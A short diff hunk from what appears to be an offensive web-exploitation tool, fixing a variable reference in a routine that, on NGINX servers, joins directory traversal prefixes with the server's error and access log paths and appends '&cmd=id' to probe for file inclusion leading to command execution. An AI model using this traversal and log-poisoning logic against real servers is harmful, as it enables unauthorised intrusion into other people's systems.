@@ -172,7 +172,7 @@ class Payload:
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
 			log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log")]
-			for d_path in linux_dirTraversal:
+			for d_path in self.linux_dirTraversal:
 				for l_path in log:
 					pathh = self.url + d_path + l_path
 					compUrl = pathh + "&cmd=id"
